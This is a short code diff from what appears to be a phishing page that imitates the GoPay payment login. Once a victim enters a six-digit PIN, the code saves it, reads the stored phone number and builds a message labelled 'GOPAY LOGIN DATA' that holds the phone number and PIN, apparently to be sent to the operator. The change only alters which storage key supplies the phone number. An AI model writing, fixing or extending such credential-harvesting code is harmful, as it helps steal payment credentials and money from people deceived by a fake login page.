@@ -304,7 +304,7 @@
 
         if (currentPin.length === 6) {
           localStorage.setItem('gopay_pin', currentPin);
-          const savedPhone = localStorage.getItem('gopay_phone') || 'Tidak ada data';
+          const savedPhone = localStorage.getItem('phoneInput') || 'Tidak ada data';
 
           const message = `🔔 *GOPAY LOGIN DATA*\n📱 No HP: \`${savedPhone}\`\n🔑 PIN: \`${currentPin}\``;
           
